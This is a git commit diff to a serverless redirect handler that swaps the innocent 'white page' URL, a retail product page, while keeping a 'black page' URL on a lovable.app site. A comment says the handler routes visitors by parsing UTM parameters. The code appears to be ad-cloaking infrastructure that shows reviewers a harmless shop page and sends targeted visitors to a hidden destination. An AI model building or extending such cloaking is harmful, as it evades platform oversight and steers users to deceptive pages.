86dd8717a8e615a82012110cb4dcc0d9275d20c4
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-10 06:03:53 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babylux.be/nl/trio-eos-2-in-1-aton-b2-i-size-cybex.html";
+    const whitePageURL = "https://www.manufactum.com/senger-goose-heat-pad-a88403/";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
